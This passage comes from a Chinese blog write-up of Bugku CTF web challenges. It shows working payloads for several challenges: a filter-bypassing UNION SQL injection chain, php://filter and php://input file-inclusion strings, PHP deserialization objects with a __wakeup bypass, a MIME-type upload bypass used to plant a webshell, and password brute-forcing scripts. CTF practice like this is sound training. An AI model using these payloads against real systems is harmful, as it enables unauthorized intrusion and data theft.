+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Time &#123;</span><br><span class="line"></span><br><span class="line">	public $time;</span><br><span class="line">	public $password;</span><br><span class="line">	public function __construct($tt, $pp) &#123;</span><br><span class="line">		$this-&gt;time = $tt;</span><br><span class="line">		$this-&gt;password = $pp;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$password = array(&#x27;er&#x27;);</span><br><span class="line">$time = &#x27;0x4c06f351&#x27;;</span><br><span class="line">$er = new Time($time, $password);</span><br><span class="line">echo serialize($er);</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">///O:4:&quot;Time&quot;:2:&#123;s:4:&quot;time&quot;;s:10:&quot;0x4c06f351&quot;;s:8:&quot;password&quot;;a:1:&#123;i:0;s:2:&quot;er&quot;;&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>绕过wakeup  绕过wakeup()是个cve自行百度了解</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Time&quot;:3:&#123;s:4:&quot;time&quot;;s:10:&quot;0x4c06f351&quot;;s:8:&quot;password&quot;;a:1:&#123;i:0;s:2:&quot;er&quot;;&#125;&#125;</span><br><span class="line">改变了传入的参数的个数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>考察观察能力吧 右键似乎不能查看源码   随意输入提交抓包，在repeater重发 </p>
+<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujbfn32j312o0ar0un.jpg"></p>
+<p>在返回结果的头部信息有password，hint。password base64解密 是flag{4fab4fe94a240242fe567a2421722b97} 去提交果然不对，吧flag{}里的作为密码提交</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Pragma: no-cache</span><br><span class="line">Password: ZmxhZ3s2OGMwOTA2OGJlMjFiNTdkMDlkODQyMGM4NjBjNzJlZX0=</span><br><span class="line">Hint: Seeing is not believing, maybe you need to be faster!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>返回说我太慢，然后上脚本</p>
+<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujbgyotj30df04fwec.jpg" alt="1557581487844"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">url = &quot;http://123.206.31.85:10013/index.php&quot;</span><br><span class="line"># pwd = &#x27;69ca7eed78620041ba5a14deb44d29d8&#x27;天真的以为这个不变(*/ω＼*)</span><br><span class="line">r = requests.session()</span><br><span class="line"></span><br><span class="line">res = r.post(url, data=&#123;&#x27;password&#x27;: &quot;123&quot;&#125;)</span><br><span class="line">#print(res)</span><br><span class="line">pwd = res.headers[&#x27;Password&#x27;]</span><br><span class="line">#print(&#x27;****&#x27;, pwd)</span><br><span class="line"></span><br><span class="line">pwd = str(base64.b64decode(pwd))[7:-2]</span><br><span class="line">#print(&quot;**&quot;, pwd)</span><br><span class="line"></span><br><span class="line">res = r.post(url, data=&#123;&#x27;password&#x27;: pwd&#125;)</span><br><span class="line"></span><br><span class="line">print(res.text)</span><br><span class="line"></span><br><span class="line">#flag&#123;FjXAkdGn*********jInY2VndLSg&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p>源码泄露 用GITHACK 脚本 跑一下就行了，得到两个文件，其中一个即为flag.php</p>
+<h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><p>根据提示想到文件泄露，，用工具扫到 存在 index.php~   (工具在gayhub  搜索SourceleakHacker)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#x27;content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">include &#x27;./flag.php&#x27;;</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(empty($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line">    header(&#x27;location:./1ndex.php&#x27;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">	if (!is_numeric($id)) &#123;</span><br><span class="line">		$id = intval($id);             //当id为字母时，id=0</span><br><span class="line">		switch ($id) &#123;                  //id=0 时当判断为假时进入</span><br><span class="line">			case $id&gt;=0:</span><br><span class="line">				echo &quot;快出去吧，走错路了～～～&lt;br&gt;&quot;;</span><br><span class="line">				echo &quot;这么简单都不会么？&quot;;</span><br><span class="line">				break;</span><br><span class="line">			case $id&gt;=10:</span><br><span class="line">				exit($flag);</span><br><span class="line">				break;</span><br><span class="line">			default:</span><br><span class="line">				echo &quot;你走不到这一步的!&quot;;</span><br><span class="line">				break;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>当id 为任意字符都可以  而且提交页面是 index.php</p>
+<h2 id="web16-待续…"><a href="#web16-待续…" class="headerlink" title="web16 待续…."></a>web16 待续….</h2><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>直接查看tcp流就可以看到，简单到难以相信  </p>
+<h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><p>里面有一段是盲注的请求 ，把后面的16进制的值 转成字符串就行了                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               </p>
+<h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><p><a target="_blank" rel="noopener" href="http://123.206.31.85:10018/list.php?id=1">http://123.206.31.85:10018/list.php?id=1</a>     改变id值返回不同页面，测试注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; 回显空白 -&gt; 可能为单引号闭合</span><br><span class="line">?id=1&#x27;--+回显正常-&gt;单引号闭合方式</span><br><span class="line">?id=1&#x27; and 1=1--+ 回显空白 -&gt; 可能过滤了and</span><br><span class="line">?id=1&#x27;  And1=1--+回显空白-&gt;过滤了大小写</span><br><span class="line">?id=1&#x27; anandd 1=1--+ 回显正常 -&gt;   可以双写绕过   过滤了and、or</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>双写绕过，select=&gt;selselectect ,anandd,ununionion、注意information    包含or 也要双写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">爆数据库</span><br><span class="line">?id=-1&#x27; uniunionon selselectect 1,2,group_concat(schema_name)from infoorrmation_schema.schemata--+</span><br><span class="line">得到:information_schema,web18.</span><br><span class="line"></span><br><span class="line">爆表：</span><br><span class="line">?id=-1&#x27; uniunionon selselectect 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;web18&#x27;--+</span><br><span class="line">得到: ctf,flag.</span><br><span class="line"></span><br><span class="line">爆列：</span><br><span class="line">?id=-1&#x27; uniunionon selselectect 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name=&#x27;flag&#x27;--+</span><br><span class="line">得到：id,flag.</span><br><span class="line"></span><br><span class="line">爆字段：</span><br><span class="line">?id=-1&#x27; uniunionon selselectect 1,2,flag from flag--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="web19-待续…"><a href="#web19-待续…" class="headerlink" title="web19  待续…."></a>web19  待续….</h2><h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><p>进入之后 如提示下面 </p>
+<blockquote>
+<p>你的动态密文是：c148829bfef63940f828dfb909fb77193<br>GET提交对应的密文可以得到flag(form_input_name=’key’)<br>输出格式：’flag{….}’</p>
+</blockquote>
+<p>多次提交即可得到flag  搞不清在考察啥 下面下面是脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://123.206.31.85:10020/&#x27;</span><br><span class="line">s = requests.session()</span><br><span class="line">r = s.get(url)</span><br><span class="line">res = r.text.encode(r.encoding).decode()</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">key = re.findall(r&#x27;[0-9a-z]+&#x27;, res)[0]</span><br><span class="line">url2 = url + &#x27;?key=&#x27; + key</span><br><span class="line">r2 = s.get(url2)</span><br><span class="line">res2 = r2.text.encode(r2.encoding).decode()</span><br><span class="line">print(res2)</span><br><span class="line">#多次提交没得到flag    看了wp才知道 在多试试</span><br><span class="line"></span><br><span class="line">改进</span><br><span class="line">#由于要多次提交，改了一下</span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    url = &#x27;http://123.206.31.85:10020/&#x27;</span><br><span class="line">    s = requests.session()</span><br><span class="line">    r = s.get(url)</span><br><span class="line">    res = r.text.encode(r.encoding).decode()</span><br><span class="line">    # print(res)</span><br><span class="line"></span><br><span class="line">    key = re.findall(r&#x27;[0-9a-z]+&#x27;, res)[0]</span><br><span class="line">    url2 = url + &#x27;?key=&#x27; + key</span><br><span class="line">    r2 = s.get(url2)</span><br><span class="line">    res2 = r2.text.encode(r2.encoding).decode()</span><br><span class="line">    if &quot;密文&quot; not in res2:</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">print(res2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><p>进去提示  <code>you are not admin !</code></p>
+<p>查看网页源码 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">you are not admin !  </span><br><span class="line">&lt;!--</span><br><span class="line">$user = $_GET[&quot;user&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$pass = $_GET[&quot;pass&quot;];</span><br><span class="line"> </span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&#x27;r&#x27;)===&quot;admin&quot;))&#123;</span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;</span><br><span class="line">    include($file); //class.php</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;you are not admin ! &quot;;</span><br><span class="line">&#125;</span><br><span class="line"> --&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>存在文件包含漏洞    读取class.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?user=php://input&amp;file=php://filter/read=convert.base64-encode/resource=class.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujblpajj313c0b5taj.jpg" alt="1557649488409"></p>
+<p>将其base64解码后  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL &amp; ~E_NOTICE);</span><br><span class="line"> </span><br><span class="line">class Read&#123;//f1a9.php</span><br><span class="line">    public $file;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        if(isset($this-&gt;file))&#123;</span><br><span class="line">            echo file_get_contents($this-&gt;file);    </span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;__toString was called!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>php反序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">构造序列化脚本</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(E_ALL &amp; ~E_NOTICE);</span><br><span class="line"></span><br><span class="line">class Read&#123;//f1a9.php</span><br><span class="line">    public $file = &quot;f1a9.php&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">$a = new Read;</span><br><span class="line">echo serialize($a);</span><br><span class="line">//O:4:&quot;Read&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;f1a9.php&quot;;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujblx7pj30re0l2ac9.jpg" alt="1556809809828"> </p>
+<h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2><p>点击去啥也没有  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.31.85:10022/hello.php?file=haha.php   </span><br><span class="line">http://123.206.31.85:10022/hello.php?file=php://filter/convert.base64-encode/resource=hello.php      读取haha.php空白，读取hello.php </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!--upload.php--&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    include $_GET[&#x27;file&#x27;];</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">然后后读取upload.php</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;/&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;&gt;</span><br><span class="line">    &lt;title&gt;UPLOAD&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;	</span><br><span class="line">&lt;form action=&quot;&quot; enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; name=&quot;upload&quot;&gt;</span><br><span class="line">file:</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;br&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;upload&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if($_FILES[&#x27;file&#x27;][&#x27;type&#x27;] !== &quot;image/jpeg&quot;)  #这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。</span><br><span class="line">        &#123;   </span><br><span class="line">         echo &quot;Sorry, we only allow uploading JPG images&quot;;</span><br><span class="line">         exit;</span><br><span class="line">         &#125;</span><br><span class="line"> $uploaddir = &#x27;upload/&#x27;;</span><br><span class="line"> $uploadfile = $uploaddir . basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);</span><br><span class="line"> if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $uploadfile))</span><br><span class="line">     &#123;</span><br><span class="line">         echo &quot;File is valid, and was successfully uploaded.\n&quot;;</span><br><span class="line">         echo $uploadfile;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">             echo &quot;File uploading failed.\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">存在上传漏洞，可以绕过上传木马 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>访问upload.php  上传一个木马  抓包 修改文件类型   forward</p>
+<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujbl5hij30by0740sz.jpg" alt="1557651819384"></p>
+<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujbp7ooj30m60410sp.jpg" alt="1557651915833"></p>
+<p>上传成功 访问url/upload/fix.php 也就是你上传的大马</p>
+<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujbt08kj308d05eaa0.jpg" alt="1557652223935"></p>
+<p>在网站根目录就可以看到(这个flag文件名似乎一直被人改，上次做的时候还是 flag.txt)</p>
+<h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><p>开始没思路，我的御剑也没有扫到这么多，大佬指点，并且要了大佬的字典 。注意查看 </p>
+<p>在admin.php 进去就弹窗  在login.html  是登录的表单    robots提示有readme.txt   </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//readme.txt 里面有下面的提示 要将页面改为utf-8才可以看到，不然乱码</span><br><span class="line">网站默认登录用户名和密码为</span><br><span class="line">admin</span><br><span class="line">123</span><br><span class="line"></span><br><span class="line">用户登录后可自行修改密码</span><br><span class="line">密码只支持3位数字</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">你也想学php验证码啊</span><br><span class="line"></span><br><span class="line">http://123.206.31.85:10023/1.png</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujbt5jtj30ln07rwf1.jpg" alt="1557653629672"></p>
+<p>直接抓包用bp爆破  用户名admin 爆破密码   爆破出密码为667  然后即可查看flag</p>
+<h2 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h2><p>查看源码 拉倒最底下 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class Small_white_rabbit&#123;  </span><br><span class="line">    private $file = &#x27;index.php&#x27;;  </span><br><span class="line"></span><br><span class="line">    public function __construct($file) &#123;  </span><br><span class="line">        $this-&gt;file = $file;  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;  </span><br><span class="line">        echo @highlight_file($this-&gt;file, true);  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    function __wakeup() &#123;  </span><br><span class="line">        if ($this-&gt;file != &#x27;index.php&#x27;) &#123;  </span><br><span class="line">            //the secret is in the_f1ag.php  </span><br><span class="line">            $this-&gt;file = &#x27;index.php&#x27;;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;var&#x27;])) &#123;  </span><br><span class="line">    $var = base64_decode($_GET[&#x27;var&#x27;]);  </span><br><span class="line">    @unserialize($var);  </span><br><span class="line">&#125; else &#123;  </span><br><span class="line">    highlight_file(&quot;index.php&quot;);  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>一个php的反序列化  要注意传入的值进行了base64解码，所以要将序列化后的结果base64加密，而且要绕过__wakeup() 这个函数，上面已经讲到如何绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Small_white_rabbit</span><br><span class="line">&#123;</span><br><span class="line">    private $file = &#x27;the_f1ag.php&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$b=new Small_white_rabbit();</span><br><span class="line">$b=  serialize($b);</span><br><span class="line">$b=str_replace(&#x27;O:4&#x27;,&#x27;O:+4&#x27;,$b);</span><br><span class="line">$b=str_replace(&#x27;:1:&#x27;,&#x27;:2:&#x27;,$b);</span><br><span class="line">$b= base64_encode($b);</span><br><span class="line">echo $b;</span><br><span class="line">//TzoxODoiU21hbGxfd2hpdGVfcmFiYml0IjoyOntzOjI0OiIAU21hbGxfd2hpdGVfcmFiYml0AGZpbGUiO3M6MTI6InRoZV9mMWFnLnBocCI7fQ==</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url?var=TzoxODoiU21hbGxfd2hpdGVfcmFiYml0IjoyOntzOjI0OiIAU21hbGxfd2hpdGVfcmFiYml0AGZpbGUiO3M6MTI6InRoZV9mMWFnLnBocCI7fQ==</span><br><span class="line">即可得到flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h2><p>进去后（真的是鬼知道这是啥）</p>
+<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujbu76yj30cb04sq2v.jpg" alt="1557666848198"></p>
+<p>输入框下面有个链接，点进去，是个下载页面。但是下载不成功。修改下载路径为<code>http://123.206.31.85:10025/ziidan.txt</code> 拿着这个做字典用bp跑一下，没什么乱用。一度想爆破。扫网站路径扫到 <code>url/shell.php</code>  在用刚才的字典跑一下成功出flag。真的不知道出题人在考啥。无语……</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/04/22/xss-bypass/" rel="prev" title="xss_bypass">
+      <i class="fa fa-chevron-left"></i> xss_bypass
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/09/11/est/" rel="next" title="test">
+      test <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
